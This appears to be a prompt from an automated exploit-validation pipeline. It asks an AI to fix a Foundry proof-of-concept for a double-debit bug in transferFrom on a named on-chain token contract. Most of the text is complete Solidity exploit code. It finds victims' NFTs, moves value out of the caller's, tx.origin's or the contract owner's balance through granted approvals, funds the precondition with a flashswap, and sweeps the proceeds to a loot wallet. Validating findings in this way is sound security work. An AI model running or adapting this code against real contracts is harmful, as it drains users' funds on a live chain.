You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: ERC721-style `transferFrom` debits two NFT-worths of ERC20 balance for one NFT transfer
- claim: When `value < _nextTokenId()`, `transferFrom` treats `value` as an NFT id, performs `_transfer(from, to, tokensPerNFT, false)`, then calls `_safeTransferFrom`, which performs a second `_transfer(from, to, tokensPerNFT, false)`. One NFT transfer therefore moves only one NFT id but debits and credits `2 * tokensPerNFT` fungible units.
- impact: Any owner, approved operator, or stale per-token approvee using the NFT branch of `transferFrom` can overcharge the sender by an extra whole-NFT worth of ERC20 balance. This breaks the ERC20/NFT backing invariant, gifts the recipient extra fungible value, and can strand the sender's remaining NFTs behind insufficient ERC20 balance. Holders with only one NFT-worth of balance cannot use this `transferFrom` path at all because the second debit reverts.
- exploit_paths: ["A holder owns NFT `id` and at least `2 * tokensPerNFT` fungible balance", "An authorized caller invokes `transferFrom(from, to, id)`", "The call transfers NFT `id` once but transfers `tokensPerNFT` fungible units twice"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IMinerTarget {
    function owner() external view returns (address);
    function totalSupply() external view returns (uint256);
    function tokensPerNFT() external view returns (uint256);
    function balanceOf(address owner) external view returns (uint256);
    function balanceOf(address owner, uint256 start, uint256 stop) external view returns (uint256);
    function isOwnerOf(address account, uint256 id) external view returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function isApprovedForAll(address account, address operator) external view returns (bool);
    function getApproved(uint256 id) external view returns (address);
}

interface IUniswapV2LikePair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract LootWallet {
    uint256 private constant SEARCH_WINDOW = 256;
    uint256 private constant MAX_SWEEPS = 8;

    constructor() {}

    function sweep(address target, address to) external {
        IMinerTarget token = IMinerTarget(target);
        uint256 maxIdExclusive = _maxTokenIdExclusive(token);

        // NFT-first remains necessary because the buggy NFT-path transferFrom
        // consumes an extra whole-NFT ERC20 unit per NFT move.
        for (uint256 i = 0; i < MAX_SWEEPS; ++i) {
            (bool found, uint256 tokenId) = _firstOwnedToken(token, address(this), maxIdExclusive);
            if (!found) {
                break;
            }

            try token.transferFrom(address(this), to, tokenId) returns (bool ok) {
                if (!ok) {
                    break;
                }
            } catch {
                break;
            }
        }

        uint256 bal = token.balanceOf(address(this));
        if (bal != 0) {
            try token.transfer(to, bal) returns (bool) {} catch {}
        }
    }

    function _firstOwnedToken(
        IMinerTarget target,
        address owner,
        uint256 maxIdExclusive
    ) internal view returns (bool found, uint256 tokenId) {
        if (owner == address(0) || maxIdExclusive <= 1) {
            return (false, 0);
        }

        if (target.balanceOf(owner, 1, maxIdExclusive) == 0) {
            return (false, 0);
        }

        uint256 lo = 1;
        uint256 hi = maxIdExclusive;

        while (hi - lo > SEARCH_WINDOW) {
            uint256 mid = lo + ((hi - lo) >> 1);
            if (target.balanceOf(owner, lo, mid) != 0) {
                hi = mid;
            } else {
                lo = mid;
            }
        }

        for (uint256 id = lo; id < hi; ++id) {
            if (target.isOwnerOf(owner, id)) {
                return (true, id);
            }
        }

        return (false, 0);
    }

    function _maxTokenIdExclusive(IMinerTarget target) internal view returns (uint256) {
        uint256 unit = target.tokensPerNFT();
        if (unit == 0) {
            return 1;
        }

        uint256 total = target.totalSupply();
        return (total / unit) + 1;
    }
}

contract FlawVerifier {
    address public constant TARGET = 0xE77EC1bF3A5C95bFe3be7BDbACfe3ac1c7E454CD;

    bytes32 private constant LOOT_SALT = keccak256("miner-f001-loot");
    uint256 private constant SEARCH_WINDOW = 256;

    address private immutable _loot;
    uint256 private _profitAmount;

    bool public hypothesisValidated;
    bool public hypothesisRefuted;
    address public exploitedFrom;
    uint256 public exploitedTokenId;

    address private _flashPair;
    address private _flashHolder;
    uint256 private _flashBorrowAmount;

    constructor() {
        _loot = _computeLootAddress();
    }

    function executeOnOpportunity() public {
        IMinerTarget target = IMinerTarget(TARGET);
        uint256 verifierBefore = target.balanceOf(address(this));
        uint256 unit = target.tokensPerNFT();
        uint256 maxIdExclusive = _maxTokenIdExclusive(target, unit);

        _resetState();

        // exploit_paths[0]: the holder already owns an NFT and must have
        // at least 2 * tokensPerNFT fungible balance when the vulnerable call runs.
        // A V2 flashswap, if used, only supplies the missing top-up required to
        // reach that precondition without changing the core exploit causality.
        //
        // exploit_paths[1]: an authorized caller invokes transferFrom(from, to, id).
        //
        // exploit_paths[2]: the NFT moves once but the fungible accounting moves
        // tokensPerNFT twice because transferFrom() calls _transfer() and then
        // _safeTransferFrom(), which calls _transfer() again.

        if (_attemptPathFrom(target, msg.sender, address(this), unit, maxIdExclusive)) {
            _finish(target, verifierBefore);
            return;
        }

        if (tx.origin != msg.sender && _attemptPathFrom(target, tx.origin, address(this), unit, maxIdExclusive)) {
            _finish(target, verifierBefore);
            return;
        }

        if (_attemptPathFrom(target, address(this), _loot, unit, maxIdExclusive)) {
            _realizeLootIfPossible();
            _finish(target, verifierBefore);
            return;
        }

        _attemptFlashswapTopUp(target, unit, maxIdExclusive);
        if (hypothesisValidated) {
            _finish(target, verifierBefore);
            return;
        }

        address owner = target.owner();
        if (_attemptPathFrom(target, owner, address(this), unit, maxIdExclusive)) {
            _finish(target, verifierBefore);
            return;
        }

        if (_attemptPathFrom(target, owner, _loot, unit, maxIdExclusive)) {
            _realizeLootIfPossible();
            _finish(target, verifierBefore);
            return;
        }

        _finish(target, verifierBefore);
    }

    // The pair callback is only used as realistic temporary funding so the
    // holder can satisfy exploit_paths[0]. The profit still comes from the
    // target's double fungible transfer inside the buggy NFT-path transferFrom().
    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(msg.sender == _flashPair, "unexpected pair");
        require(sender == address(this), "unexpected sender");

        uint256 borrowed = amount0 != 0 ? amount0 : amount1;
        require(borrowed == _flashBorrowAmount, "unexpected borrow");

        IMinerTarget target = IMinerTarget(TARGET);
        uint256 unit = target.tokensPerNFT();
        uint256 maxIdExclusive = _maxTokenIdExclusive(target, unit);

        require(_safeTargetTransfer(target, _flashHolder, borrowed), "top-up failed");

        bool ok = _attemptPathFrom(target, _flashHolder, address(this), unit, maxIdExclusive);
        require(ok && hypothesisValidated, "path not realized");

        uint256 fee = _v2Fee(borrowed);
        require(_safeTargetTransfer(target, _flashPair, borrowed + fee), "repay failed");

        _clearFlash();
    }

    function profitToken() external pure returns (address) {
        return TARGET;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function lootAddress() external view returns (address) {
        return _loot;
    }

    function deployLootWallet() external returns (address deployed) {
        deployed = _deployLootWallet();
    }

    function _attemptFlashswapTopUp(IMinerTarget target, uint256 unit, uint256 maxIdExclusive) internal {
        if (_attemptFlashswapTopUpFrom(target, msg.sender, unit, maxIdExclusive)) {
            return;
        }

        if (tx.origin != msg.sender) {
            _attemptFlashswapTopUpFrom(target, tx.origin, unit, maxIdExclusive);
        }
    }

    function _attemptFlashswapTopUpFrom(
        IMinerTarget target,
        address holder,
        uint256 unit,
        uint256 maxIdExclusive
    ) internal returns (bool) {
        if (holder == address(0) || holder == address(this) || holder == _loot) {
            return false;
        }

        (bool hasToken, uint256 tokenId) = _firstOwnedToken(target, holder, maxIdExclusive);
        if (!hasToken) {
            return false;
        }

        if (!_isAuthorized(target, holder, tokenId)) {
            return false;
        }

        uint256 holderBalance = target.balanceOf(holder);
        uint256 neededForBug = unit * 2;
        if (holderBalance >= neededForBug) {
            return false;
        }

        uint256 borrowAmount = neededForBug - holderBalance;
        uint256 fee = _v2Fee(borrowAmount);
        if (holderBalance <= fee) {
            return false;
        }

        address pair = _findLocalPairCandidate(target);
        if (pair == address(0)) {
            return false;
        }

        (bool targetIsToken0, bool usable) = _pairTargetSide(pair);
        if (!usable) {
            return false;
        }

        _flashPair = pair;
        _flashHolder = holder;
        _flashBorrowAmount = borrowAmount;

        try
            IUniswapV2LikePair(pair).swap(
                targetIsToken0 ? borrowAmount : 0,
                targetIsToken0 ? 0 : borrowAmount,
                address(this),
                hex"01"
            )
        {
            return hypothesisValidated;
        } catch {
            _clearFlash();
            return false;
        }
    }

    function _attemptPathFrom(
        IMinerTarget target,
        address holder,
        address recipient,
        uint256 unit,
        uint256 maxIdExclusive
    ) internal returns (bool) {
        if (holder == address(0) || recipient == address(0) || holder == recipient) {
            return false;
        }

        if (holder == _loot && recipient == address(this) && _loot.code.length == 0) {
            return false;
        }

        (bool hasToken, uint256 tokenId) = _firstOwnedToken(target, holder, maxIdExclusive);
        if (!hasToken) {
            return false;
        }

        uint256 holderBefore = target.balanceOf(holder);
        if (holderBefore < unit * 2) {
            return false;
        }

        if (!_isAuthorized(target, holder, tokenId)) {
            return false;
        }

        uint256 recipientBefore = target.balanceOf(recipient);

        try target.transferFrom(holder, recipient, tokenId) returns (bool ok) {
            if (!ok) {
                return false;
            }
        } catch {
            return false;
        }

        uint256 holderAfter = target.balanceOf(holder);
        uint256 recipientAfter = target.balanceOf(recipient);

        if (holderAfter + (unit * 2) == holderBefore && recipientAfter == recipientBefore + (unit * 2)) {
            hypothesisValidated = true;
            exploitedFrom = holder;
            exploitedTokenId = tokenId;
        } else {
            hypothesisRefuted = true;
        }

        return true;
    }

    function _firstOwnedToken(
        IMinerTarget target,
        address owner,
        uint256 maxIdExclusive
    ) internal view returns (bool found, uint256 tokenId) {
        if (owner == address(0) || maxIdExclusive <= 1) {
            return (false, 0);
        }

        if (target.balanceOf(owner, 1, maxIdExclusive) == 0) {
            return (false, 0);
        }

        uint256 lo = 1;
        uint256 hi = maxIdExclusive;

        while (hi - lo > SEARCH_WINDOW) {
            uint256 mid = lo + ((hi - lo) >> 1);
            if (target.balanceOf(owner, lo, mid) != 0) {
                hi = mid;
            } else {
                lo = mid;
            }
        }

        for (uint256 id = lo; id < hi; ++id) {
            if (target.isOwnerOf(owner, id)) {
                return (true, id);
            }
        }

        return (false, 0);
    }

    function _isAuthorized(IMinerTarget target, address owner, uint256 tokenId) internal view returns (bool) {
        if (owner == address(this)) {
            return true;
        }

        return target.isApprovedForAll(owner, address(this)) || target.getApproved(tokenId) == address(this);
    }

    function _safeTargetTransfer(IMinerTarget target, address to, uint256 amount) internal returns (bool) {
        try target.transfer(to, amount) returns (bool ok) {
            return ok;
        } catch {
            return false;
        }
    }

    function _findLocalPairCandidate(IMinerTarget target) internal view returns (address) {
        address owner = target.owner();
        if (_looksLikeTargetPair(owner)) {
            return owner;
        }

        if (_looksLikeTargetPair(msg.sender)) {
            return msg.sender;
        }

        if (tx.origin != msg.sender && _looksLikeTargetPair(tx.origin)) {
            return tx.origin;
        }

        return address(0);
    }

    function _looksLikeTargetPair(address candidate) internal view returns (bool) {
        (, bool usable) = _pairTargetSide(candidate);
        return usable;
    }

    function _pairTargetSide(address pair) internal view returns (bool targetIsToken0, bool usable) {
        if (pair == address(0) || pair.code.length == 0) {
            return (false, false);
        }

        try IUniswapV2LikePair(pair).token0() returns (address token0) {
            try IUniswapV2LikePair(pair).token1() returns (address token1) {
                if (token0 == TARGET) {
                    return (true, true);
                }

                if (token1 == TARGET) {
                    return (false, true);
                }
            } catch {}
        } catch {}

        return (false, false);
    }

    function _realizeLootIfPossible() internal {
        if (_loot.code.length == 0) {
            _deployLootWallet();
        }

        try LootWallet(_loot).sweep(TARGET, address(this)) {} catch {}
    }

    function _finish(IMinerTarget target, uint256 verifierBefore) internal {
        _profitAmount = _netVerifierGain(target, verifierBefore);
    }

    function _netVerifierGain(IMinerTarget target, uint256 verifierBefore) internal view returns (uint256) {
        uint256 verifierAfter = target.balanceOf(address(this));
        if (verifierAfter <= verifierBefore) {
            return 0;
        }

        return verifierAfter - verifierBefore;
    }

    function _resetState() internal {
        _profitAmount = 0;
        hypothesisValidated = false;
        hypothesisRefuted = false;
        exploitedFrom = address(0);
        exploitedTokenId = 0;
        _clearFlash();
    }

    function _clearFlash() internal {
        _flashPair = address(0);
        _flashHolder = address(0);
        _flashBorrowAmount = 0;
    }

    function _v2Fee(uint256 borrowed) internal pure returns (uint256) {
        return ((borrowed * 3) / 997) + 1;
    }

    function _deployLootWallet() internal returns (address deployed) {
        if (_loot.code.length != 0) {
            return _loot;
        }

        deployed = address(new LootWallet{salt: LOOT_SALT}());
        require(deployed == _loot, "loot mismatch");
    }

    function _computeLootAddress() internal view returns (address) {
        bytes32 hash = keccak256(
            abi.encodePacked(
                bytes1(0xff),
                address(this),
                LOOT_SALT,
                keccak256(type(LootWallet).creationCode)
            )
        );
        return address(uint160(uint256(hash)));
    }

    function _maxTokenIdExclusive(IMinerTarget target, uint256 unit) internal view returns (uint256) {
        if (unit == 0) {
            return 1;
        }

        return (target.totalSupply() / unit) + 1;
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 2.58s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:78:19:
   |
78 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^

[2m2026-05-17T17:03:47.609577Z[0m [31mERROR[0m [2msharedbackend[0m[2m:[0m Failed to send/recv `storage` [3merr[0m[2m=[0mfailed to get storage for 0xE77EC1bF3A5C95bFe3be7BDbACfe3ac1c7E454CD at 25197844203182321342282646000422871445575739549561321115174011820557870371541: server returned an error response: error code -32603: failed to get storage for 0xE77EC1bF3A5C95bFe3be7BDbACfe3ac1c7E454CD at 25197844203182321342282646000422871445575739549561321115174011820557870371541: Max retries exceeded HTTP error 429 with body: {"code":-32005,"message":"Too Many Requests","data":{"see":"https://infura.io/dashboard"}} [3maddress[0m[2m=[0m0xE77EC1bF3A5C95bFe3be7BDbACfe3ac1c7E454CD [3mindex[0m[2m=[0m25197844203182321342282646000422871445575739549561321115174011820557870371541

Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: EVM error; database error: failed to get storage for 0xE77EC1bF3A5C95bFe3be7BDbACfe3ac1c7E454CD at 25197844203182321342282646000422871445575739549561321115174011820557870371541: server returned an error response: error code -32603: failed to get storage for 0xE77EC1bF3A5C95bFe3be7BDbACfe3ac1c7E454CD at 25197844203182321342282646000422871445575739549561321115174011820557870371541: Max retries exceeded HTTP error 429 with body: {"code":-32005,"message":"Too Many Requests","data":{"see":"https://infura.io/dashboard"}}] testExploit() (gas: 0)
Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 29.04s (28.64s CPU time)

Ran 1 test suite in 29.18s (29.04s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: EVM error; database error: failed to get storage for 0xE77EC1bF3A5C95bFe3be7BDbACfe3ac1c7E454CD at 25197844203182321342282646000422871445575739549561321115174011820557870371541: server returned an error response: error code -32603: failed to get storage for 0xE77EC1bF3A5C95bFe3be7BDbACfe3ac1c7E454CD at 25197844203182321342282646000422871445575739549561321115174011820557870371541: Max retries exceeded HTTP error 429 with body: {"code":-32005,"message":"Too Many Requests","data":{"see":"https://infura.io/dashboard"}}] testExploit() (gas: 0)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
